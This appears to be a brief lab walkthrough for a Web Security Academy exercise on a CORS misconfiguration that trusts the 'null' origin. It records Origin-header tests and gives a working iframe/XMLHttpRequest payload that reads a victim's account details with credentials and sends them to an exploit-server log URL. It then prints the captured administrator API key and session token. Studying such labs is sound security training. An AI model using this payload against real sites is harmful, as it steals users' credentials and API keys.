```javascript

1. Open the lab and login with the credentials
2. Navigate to the Burp HTTP history and look for the request /accountDetails

RESPONSE
It has  Access-Control-Allow-Credentials: true

TEST 1
Add the header Origin: https://google.com to the request and send it

RESULT 1
The response didnâ€™t reflect our header

TEST 2
Origin: null

RESULT 2
Access-Control-Allow-Origin: null  --  Response from the server

TEST 3
Origin: https://0a6800f5030dd9eb821d51b0001f00dc.web-security-academy.net

RESULT 3
Access-Control-Allow-Origin: https://0a6800f5030dd9eb821d51b0001f00dc.web-security-academy.net  --  Response from the server  --  We can request the credentials from any host without restriction

PAYLOAD

<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a6800f5030dd9eb821d51b0001f00dc.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a9f006b039bd95282e3508d014e0050.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>" ></iframe>

3. Go to exploit server and deliver this payload to the victim
4. Open access log and copy the response and Decode as URL

{
  "username": "administrator",
  "email": "",
  "apikey": "XkUhaF2xFSgYtYEbMZN7rYOtlzx2dP8X",
  "sessions": [
    "MLUSQJ3g1Anrqlv6ADDBEQLwBge3wMqb"
  ]
}

5. Submit the API key and done

```
